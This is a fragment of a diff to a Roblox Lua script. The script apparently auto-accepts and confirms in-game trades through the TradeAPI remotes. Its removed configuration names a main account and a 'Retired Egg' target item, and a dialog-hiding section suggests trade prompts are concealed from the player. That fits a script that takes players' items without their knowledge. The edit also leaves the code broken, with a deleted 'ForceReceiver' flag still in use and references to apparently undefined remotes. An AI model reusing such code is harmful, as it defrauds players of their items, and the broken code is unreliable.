@@ -4,10 +4,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- Configuration
-local MainAccUsername = {"Her0eXBuildera31"}
-local TARGET_ITEM_NAME = "Retired Egg"
-local TARGET_ITEM_FORM = "NORMAL"
-local ForceReceiver = false
+
 local targetFrameNames = {"Dialog"}
 
 -- Remotes / modules
@@ -407,36 +404,33 @@ task.spawn(function()
                     currentTargetIndex += 1
                 end
             end
-        end
-    end)
+        end)
 
     task.spawn(function()
         while true do
             if ForceReceiver then
                 acceptTradeForAll()
 
-                local ForceAcceptNeg =
-                    API:WaitForChild("TradeAPI/AcceptNegotiation")
-
-                local ForceConfirmTrade =
-                    API:WaitForChild("TradeAPI/ConfirmTrade")
-
                 task.wait(1)
 
                 pcall(function()
-                    ForceAcceptNeg:FireServer()
+                    AcceptNeg:FireServer()
                 end)
 
                 task.wait(0.5)
 
                 pcall(function()
-                    ForceConfirmTrade:FireServer()
+                    ConfirmTrade:FireServer()
                 end)
-            end
 
-            task.wait(3)
+                task.wait(4)
+            else
+                task.wait(1)
+            end
         end
-    end)
+    end
+end)
+    
 
     --------------------------------------------------
     -- HIDE DIALOG
